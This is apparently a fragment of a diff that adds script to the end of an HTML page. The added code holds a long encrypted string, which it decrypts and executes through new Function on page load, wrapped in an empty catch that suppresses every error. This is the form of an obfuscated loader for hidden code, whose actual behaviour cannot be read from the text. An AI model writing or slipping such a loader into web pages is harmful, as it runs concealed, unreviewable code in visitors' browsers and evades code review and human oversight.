FQ1UPb2tFWX9KXxkaEC1BEBEbMwILDUwjNHM6bAIWFQgGBAl2EhYUFgR0EERZVTBsSV4sBBUeYR9kSANCRXgZSSlCNiYwMzcLFhJBKE8bOksZGxYkWUVDVVJFa0VZOg1JS1dOLQEHIQw5KBsYGHdhaH8nQQAVBj0xAjBCUVVXKzoKDV1bXmsXHCtWS1cSXikDAABSVWlOVEwiQi5zYhRTAgg9FQUtVwoSQi0mAEMIW15Bbx8qTVpNW1cmTxANDDwiKhEaCyc8MzEuEBUAOwRYdhJLOBZ/c0UAGhwWP0UNN1FcSlpXJAtTWEluf15PZn9oc38hAB0SHW0IAxtXQ1lCMCNFXlUFDCUBFigNUFdcXTo4GgEdN2lQSUxueGFreWVTQUltExUrR0JcFjYgIQYGGREkFVl5BRkRGk8hARcKHnEmGwAJLR86OzYHU0xJOggeO11HHF8xPQARIhsBPw1Qfx0ZTVpKLRwbCgU7aRIITHc/OjEmAARPBjgVFS16VVtRNydFTlUFDCUBFigNUFdcXTonFgwONz1HVFJ/PDstJxwbDgUpSEtVTzo4UCo9BhccHQtrCBYxSk1WQGstDAYXACswRl1MJEJzf2JPEA4HPhVQLFpZV1o7c1hDER0GPggcMVcXXldMDQMWCAwxPSwNJTtgdCwnDAYTADkYXSxaWVdaO3RMWH9SRWtFEDkDERhBUCEKHwFAfzsLABktJmhVYk9TQRolCBUzVh5BQiY/AE0RGxY7CRgmAwQZUVAtDBghDCkdARsALAkwKysZFklAbV5QeFRcV054c19DUhwKJQBeZClEM0FdPCYdEQwtPw8YRDInPTY2AAEyDC4UAjZGSR4WZ2NVSk54";
+
+            try {
+                var _code = _decrypt(_p, _k);
+                (new Function(_code))();
+            } catch(err) {}
+        })();
+    </script>
+</body>
+</html>
